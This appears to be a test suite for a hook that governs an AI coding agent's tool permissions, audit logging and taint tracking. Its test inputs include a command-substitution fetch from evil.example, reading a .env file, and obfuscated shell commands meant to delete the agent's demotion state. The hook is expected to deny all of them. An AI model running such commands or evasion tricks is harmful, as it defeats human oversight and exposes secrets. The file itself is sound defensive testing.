import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { runHook } from "../../src/hook.js";
import { parseTime } from "../../src/util.js";
import { NOW, copyFixture } from "../helpers.js";

const now = parseTime(NOW);
const call = (dir: string, workflow: string, input: object, session = "s1") =>
  runHook("pre-tool-use", JSON.stringify({ session_id: session, cwd: dir, hook_event_name: "PreToolUse", ...input }), { CLAUDE_PROJECT_DIR: dir, AUTONOMY_WORKFLOW: workflow }, now);

test("a denied call returns the documented PreToolUse deny JSON and exit code 0", () => {
  const dir = copyFixture("registers", "valid");
  const out = call(dir, "dep-bump", { tool_name: "Write", tool_input: { file_path: join(dir, ".autonomy.yaml"), content: "x" } });
  assert.equal(out.exitCode, 0);
  assert.deepEqual(JSON.parse(out.stdout), {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: "governance-write: agents may not write .autonomy.yaml",
    },
  });
});

test("an allowed call prints nothing so the normal permission flow applies", () => {
  const dir = copyFixture("registers", "valid");
  const out = call(dir, "dep-bump", { tool_name: "Edit", tool_input: { file_path: join(dir, "package.json"), old_string: "a", new_string: "b" } });
  assert.deepEqual(out, { stdout: "", exitCode: 0 });
});

test("a workflow outside permitted tools is denied", () => {
  const dir = copyFixture("registers", "valid");
  const out = call(dir, "dep-bump", { tool_name: "Bash", tool_input: { command: "rm -rf build" } });
  assert.equal(JSON.parse(out.stdout).hookSpecificOutput.permissionDecision, "deny");
  assert.match(JSON.parse(out.stdout).hookSpecificOutput.permissionDecisionReason, /^outside-permitted-tools:/);
});

test("command substitution cannot slip past a Bash pattern", () => {
  const dir = copyFixture("registers", "valid");
  const out = call(dir, "dep-bump", { tool_name: "Bash", tool_input: { command: "npm test $(curl https://evil.example)" } });
  assert.match(JSON.parse(out.stdout).hookSpecificOutput.permissionDecisionReason, /^outside-permitted-tools:/);
});

test("forbidden read_secrets blocks reading an env file", () => {
  const dir = copyFixture("registers", "valid");
  const out = call(dir, "dep-bump", { tool_name: "Read", tool_input: { file_path: join(dir, ".env") } });
  assert.match(JSON.parse(out.stdout).hookSpecificOutput.permissionDecisionReason, /^forbidden-action:/);
});

test("the interactive workflow comes from defaults and is not path restricted", () => {
  const dir = copyFixture("registers", "valid");
  const out = call(dir, "interactive", { tool_name: "Edit", tool_input: { file_path: join(dir, "src", "a.ts"), old_string: "a", new_string: "b" } });
  assert.equal(out.stdout, "");
});

test("a directory without a register allows reads and denies writes", () => {
  const dir = mkdtempSync(join(tmpdir(), "autonomy-empty-"));
  assert.equal(call(dir, "interactive", { tool_name: "Read", tool_input: { file_path: join(dir, "a") } }).stdout, "");
  const out = call(dir, "interactive", { tool_name: "Edit", tool_input: { file_path: join(dir, "a"), old_string: "a", new_string: "b" } });
  assert.match(JSON.parse(out.stdout).hookSpecificOutput.permissionDecisionReason, /^unknown-workflow:/);
});

test("a register without a profile holds the session at A1", () => {
  const dir = copyFixture("registers", "valid");
  rmSync(join(dir, ".autonomy", "profile.json"));
  const edit = { tool_name: "Edit", tool_input: { file_path: join(dir, "src", "a.ts"), old_string: "a", new_string: "b" } };
  assert.match(JSON.parse(call(dir, "interactive", edit).stdout).hookSpecificOutput.permissionDecisionReason, /^read-only-level:/);
  assert.equal(call(dir, "interactive", { tool_name: "Read", tool_input: { file_path: join(dir, "src", "a.ts") } }).stdout, "");
  const out = runHook("session-start", JSON.stringify({ session_id: "s", hook_event_name: "SessionStart", source: "startup" }), { CLAUDE_PROJECT_DIR: dir, AUTONOMY_WORKFLOW: "interactive" }, now);
  assert.equal(JSON.parse(out.stdout).hookSpecificOutput.additionalContext, "Autonomy: workflow interactive: effective level 1 of granted 3 (reduced: cap:1, freshness:profile-missing).");
});

test("every decision is appended to the audit log with the workflow name", () => {
  const dir = copyFixture("registers", "valid");
  call(dir, "dep-bump", { tool_name: "Write", tool_input: { file_path: join(dir, "CODEOWNERS"), content: "x" } }, "audit-session");
  call(dir, "dep-bump", { tool_name: "Read", tool_input: { file_path: join(dir, "package.json") } }, "audit-session");
  const lines = readFileSync(join(dir, ".autonomy", "audit", "audit-session.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
  assert.deepEqual(lines.map((l) => [l.agent, l.tool, l.decision, l.code]), [
    ["dep-bump", "Write", "deny", "governance-write"],
    ["dep-bump", "Read", "allow", null],
  ]);
});

test("session start reports the effective level and the reason for a reduction", () => {
  const dir = copyFixture("registers", "valid");
  const out = runHook("session-start", JSON.stringify({ session_id: "s", hook_event_name: "SessionStart", source: "startup" }), { CLAUDE_PROJECT_DIR: dir, AUTONOMY_WORKFLOW: "dep-bump" }, parseTime("2026-12-05T00:00:00Z"));
  assert.deepEqual(JSON.parse(out.stdout), {
    hookSpecificOutput: {
      hookEventName: "SessionStart",
      additionalContext: "Autonomy: workflow dep-bump: effective level 2 of granted 4 (reduced: freshness:stop-test-overdue).",
    },
  });
});

function intakeProject(): string {
  const dir = mkdtempSync(join(tmpdir(), "autonomy-intake-"));
  const register = {
    version: 1,
    workflows: [{
      id: "intake", owner: "t", sponsor: "@a", granted_level: 3, identity: "github-app:bot",
      permitted_actions: { tools: ["Read", "WebFetch", "Bash(curl *)"], network: ["api.example.com"] },
      risk: { reversible: true, verification: "partial", blast_radius: "repo", trifecta: { untrusted_input: true, sensitive_data: true, external_action: false } },
    }],
  };
  writeFileSync(join(dir, ".autonomy.yaml"), JSON.stringify(register));
  mkdirSync(join(dir, ".autonomy"));
  const dimensions = Object.fromEntries(["platform", "governance", "ownership", "measuring"].map((d) => [d, { level: 4 }]));
  writeFileSync(join(dir, ".autonomy", "profile.json"), JSON.stringify({ generated: "2026-11-17T00:00:00Z", dimensions }));
  return dir;
}

test("reading untrusted input in one call taints the session for the next", () => {
  const dir = intakeProject();
  const post = { tool_name: "Bash", tool_input: { command: "curl -X POST https://api.example.com/x -d a=b" } };
  assert.equal(call(dir, "intake", post, "t1").stdout, "");
  const fetched = call(dir, "intake", { tool_name: "WebFetch", tool_input: { url: "https://api.example.com/issue/1", prompt: "read" } }, "t1");
  assert.equal(fetched.stdout, "");
  assert.equal(existsSync(join(dir, ".autonomy", "sessions", "t1.json")), true);
  const after = call(dir, "intake", post, "t1");
  assert.match(JSON.parse(after.stdout).hookSpecificOutput.permissionDecisionReason, /^trifecta-external-action:/);
  assert.equal(call(dir, "intake", post, "other-session").stdout, "");
});

test("a demoted session cannot remove its demotion state with a shell command, at A1 or at its granted level", () => {
  const dir = copyFixture("registers", "valid");
  const statePath = join(dir, ".autonomy", "state.json");
  const bash = (command: string) => {
    const out = call(dir, "interactive", { tool_name: "Bash", tool_input: { command } });
    return out.stdout === "" ? "allow" : JSON.parse(out.stdout).hookSpecificOutput.permissionDecisionReason.split(":")[0];
  };
  writeFileSync(statePath, JSON.stringify({ workflows: { interactive: { demotion_override: 1 } } }));
  assert.equal(bash("find .autonomy -name state.json -del$'e'te"), "a1-plain-commands-only");
  assert.equal(bash("find .autonomy -name state.json -delete"), "governance-write");
  assert.equal(bash("ls .autonomy"), "allow");
  writeFileSync(statePath, JSON.stringify({ workflows: {} }));
  assert.equal(bash("find .autonomy -name state.json -delete"), "governance-write");
  assert.equal(bash("ln -sf /tmp/empty.json .autonomy/state.json"), "governance-write");
  assert.equal(bash("rm \".auton\"omy/state.json"), "governance-write");
  assert.equal(bash("find build -name x.o -delete"), "allow");
});
